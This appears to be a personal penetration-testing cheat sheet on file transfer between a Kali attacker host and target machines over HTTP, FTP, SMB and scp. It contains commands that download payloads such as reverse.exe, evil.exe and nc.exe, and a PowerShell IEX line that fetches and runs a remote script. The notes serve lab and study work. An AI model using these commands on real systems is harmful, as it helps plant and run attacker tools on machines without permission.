---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[File Transfers]]  
___

## Description:  

### http
host webpage on Kali
`python3 -m http.server 80`

Get the file with:
```
curl http://192.168.19.55/test.c --output test.c

wget 172.16.0.109/test

Invoke-WebRequest http://10.10.14.45:1234/required_tool -O tool

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')

certutil.exe -urlcache -split -f http://10.20.150.101/reverse.exe reverse.exe


```

You can run a powershell script right away with:
```
C:\Users\Offsec> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
Hello World
```

### FTP server
`sudo python3 -m pyftpdlib -p21 -w`
If available, use authbind with an unprivileged account to bind to port 21
`authbind python -m pyftpdlib -p21 -w`

Or you can setup Pure-FTPd
```
sudo apt update && sudo apt install pure-ftpd

kali@kali:~$ cat ./setup-ftp.sh
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd


kali@kali:~$ chmod +x setup-ftp.sh
kali@kali:~$ sudo ./setup-ftp.sh
Password:
Enter it again:
Restarting ftp server

```


**Retrieve with Linux
`ftp 10.11.0.4`

**Retrieve with windows
```
C:\Users\offsec> ftp -h

C:\Users\offsec>echo open 10.11.0.4 21> ftp.txt
C:\Users\offsec>echo USER offsec>> ftp.txt
C:\Users\offsec>echo lab>> ftp.txt
C:\Users\offsec>echo bin >> ftp.txt
C:\Users\offsec>echo GET nc.exe >> ftp.txt
C:\Users\offsec>echo bye >> ftp.txt


C:\Users\offsec> ftp -v -n -s:ftp.txt
```

### SMB server
```
On kali:

sudo smbserver.py share `pwd`

On Windows:

net use z: \\10.10.14.10\share

```

### SMB server with samba
```
kali@kali:~$ sudo apt install samba
...
kali@kali:~$ sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old
kali@kali:~$ sudo nano /etc/samba/smb.conf
```
smb.conf
```
[visualstudio]
path = /home/kali/data
browseable = yes
read only = no
```
create a samba user that can access the share
```
kali@kali:~$ sudo smbpasswd -a kali
New SMB password:
Retype new SMB password:
Added user kali.
kali@kali:~$ sudo systemctl start smbd
kali@kali:~$ sudo systemctl start nmbd
```
create the shared folder and open up the permissions
```
kali@kali:~$ mkdir /home/kali/data
kali@kali:~$ chmod -R 777 /home/kali/data
```
On windows open up file explorer and visit `\\192.168.119.120`. When prompted provide the username and password.
### scp
```
Remote Host to Local (push):
scp username@from_host:file.txt /local/directory/

Local to Remote Host (pull):
scp file.txt username@to_host:/remote/directory/

Use -r for directories

Remote to Remote:
scp username@from_host:/remote/directory/file.txt username@to_host:/remote/directory/
```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (01:18 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
